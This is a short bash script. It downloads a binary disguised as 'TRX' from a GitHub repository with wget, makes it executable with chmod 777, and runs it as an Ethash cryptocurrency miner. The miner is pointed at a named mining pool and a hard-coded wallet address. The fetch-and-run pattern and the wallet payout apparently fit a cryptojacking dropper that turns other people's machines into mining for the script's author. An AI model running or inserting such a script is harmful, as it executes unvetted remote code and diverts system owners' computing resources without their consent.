wget https://github.com/sbwsmg/lol/raw/main/TRX
chmod 777 TRX

#!/bin/bash

POOL=stratum+tcp://asia1-pink.coinhunters.name:8008 
WALLET=0xc06C2156d40115Fc9c0190324c3359Cdf5dcea22

./TRX --algo ETHASH --pool $POOL --user $WALLET --ethstratum ETHPROXY
